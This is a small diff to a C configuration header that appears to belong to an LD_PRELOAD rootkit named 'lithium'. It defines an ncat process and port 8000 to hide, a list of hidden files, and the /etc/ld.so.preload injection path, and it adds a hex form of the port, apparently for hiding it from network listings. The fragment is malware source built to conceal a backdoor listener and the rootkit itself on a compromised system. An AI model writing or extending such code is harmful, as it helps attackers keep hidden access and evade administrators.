@@ -6,6 +6,7 @@
 /* ========================================================================== */
 #define NAME_TO_HIDE      "ncat"
 #define PORT_TO_HIDE       8000
+#define PORT_TO_HIDE_HEX  "1F40"
 #define HIDE_LIST         "secret_dir,lithium.so,ld.so.preload.dummy"
 #define PRELOAD_PATH      "/etc/ld.so.preload"
 #define DUMMY_PRELOAD     "/etc/ld.so.preload.dummy"
